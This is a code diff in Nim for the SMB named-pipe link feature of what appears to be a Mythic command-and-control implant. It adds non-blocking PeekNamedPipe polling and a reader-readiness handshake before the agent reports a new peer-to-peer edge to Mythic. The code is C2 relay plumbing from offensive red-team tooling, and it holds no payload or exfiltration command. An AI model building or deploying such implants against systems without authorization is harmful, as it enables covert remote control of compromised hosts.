@@ -42,6 +42,9 @@ proc WriteFile(hFile: HANDLE, lpBuffer: LPCVOID, nNumberOfBytesToWrite: DWORD,
                lpNumberOfBytesWritten: LPDWORD, lpOverlapped: LPOVERLAPPED): BOOL
 proc FlushFileBuffers(hFile: HANDLE): BOOL
 proc GetLastError(): DWORD
+proc PeekNamedPipe(hNamedPipe: HANDLE, lpBuffer: LPVOID, nBufferSize: DWORD,
+                   lpBytesRead: LPDWORD, lpTotalBytesAvail: LPDWORD, 
+                   lpBytesLeftThisMessage: LPDWORD): BOOL
 {.pop.}
 
 type
@@ -50,6 +53,7 @@ type
     pipeHandle: HANDLE
     active: bool
     receivedEof: bool  # True when reader thread sends empty seq EOF signal
+    readerReady: bool  # True when reader thread is ready and waiting on ReadFile
     inChannel: ptr Channel[seq[byte]]   # Mythic → Writer → Pipe
     outChannel: ptr Channel[seq[byte]]  # Pipe → Reader → Mythic
     readerThread: Thread[ptr LinkConnectionObj]
@@ -60,6 +64,7 @@ type
     pipeHandle: HANDLE
     active: bool
     receivedEof: bool
+    readerReady: bool
     inChannel: ptr Channel[seq[byte]]
     outChannel: ptr Channel[seq[byte]]
     readerThread: Thread[ptr LinkConnectionObj]
@@ -224,24 +229,41 @@ proc readFromSmbAgent(conn: ptr LinkConnectionObj) {.thread.} =
   debug "[DEBUG] Link reader thread started"
   debug &"[DEBUG] Link reader: pipeHandle={conn.pipeHandle}, active={conn.active}"
   
+  # Signal that we're about to start reading
+  conn.readerReady = true
+  debug "[DEBUG] Link reader: Marked as ready, about to enter read loop"
+  
   while conn.active:
     try:
-      debug "[DEBUG] Link reader: Attempting to read chunked message from pipe..."
-      # Read chunked message from SMB agent
-      let data = receiveChunkedMessage(conn.pipeHandle)
-      
-      if data.len == 0:
-        # Connection closed or error
-        debug "[DEBUG] Link reader: Connection closed, sending EOF and exiting"
-        conn.active = false  # Mark as inactive to stop writer thread too
-        conn.outChannel[].send(@[])  # EOF signal
+      # Use PeekNamedPipe to check if data is available before blocking
+      var bytesAvail: DWORD = 0
+      if PeekNamedPipe(conn.pipeHandle, nil, 0, nil, addr bytesAvail, nil) != 0:
+        if bytesAvail > 0:
+          debug &"[DEBUG] Link reader: {bytesAvail} bytes available, reading..."
+          # Read chunked message from SMB agent
+          let data = receiveChunkedMessage(conn.pipeHandle)
+          
+          if data.len == 0:
+            # Connection closed or error
+            debug "[DEBUG] Link reader: Connection closed, sending EOF and exiting"
+            conn.active = false  # Mark as inactive to stop writer thread too
+            conn.outChannel[].send(@[])  # EOF signal
+            break
+          
+          debug &"[DEBUG] Link reader: Received {data.len} bytes from SMB agent"
+          
+          # Send to main thread
+          conn.outChannel[].send(data)
+          debug &"[DEBUG] Link reader: Sent {data.len} bytes to outChannel"
+        else:
+          # No data available, sleep briefly and check again
+          sleep(100)
+      else:
+        let err = GetLastError()
+        debug &"[DEBUG] Link reader: PeekNamedPipe failed, error: {err}"
+        conn.active = false
+        conn.outChannel[].send(@[])
         break
-      
-      debug &"[DEBUG] Link reader: Received {data.len} bytes from SMB agent"
-      
-      # Send to main thread
-      conn.outChannel[].send(data)
-      debug &"[DEBUG] Link reader: Sent {data.len} bytes to outChannel"
       
     except:
       let e = getCurrentException()
@@ -546,6 +568,7 @@ proc handleLink*(taskId: string, params: JsonNode): JsonNode =
     connPtr.pipeHandle = pipeHandle
     connPtr.active = true
     connPtr.receivedEof = false
+    connPtr.readerReady = false
     connPtr.inChannel = inChan
     connPtr.outChannel = outChan
     
@@ -562,6 +585,20 @@ proc handleLink*(taskId: string, params: JsonNode): JsonNode =
     debug "[DEBUG] Link: Reader thread created"
     createThread(conn.writerThread, writeToSmbAgent, connPtr)
     debug "[DEBUG] Link: Writer thread created"
+    
+    # Wait for reader thread to be ready (up to 2 seconds)
+    var waited = 0
+    while not connPtr.readerReady and waited < 2000:
+      sleep(10)
+      waited += 10
+    
+    if connPtr.readerReady:
+      debug &"[DEBUG] Link: Reader thread ready after {waited}ms"
+      # Give an extra moment for reader to actually enter ReadFile blocking state
+      sleep(100)
+      debug "[DEBUG] Link: Proceeding after reader startup delay"
+    else:
+      debug "[DEBUG] Link: Warning - reader thread not ready after 2 seconds, proceeding anyway"
     
     # Send edge notification to Mythic
     let edgeNotification = %* {
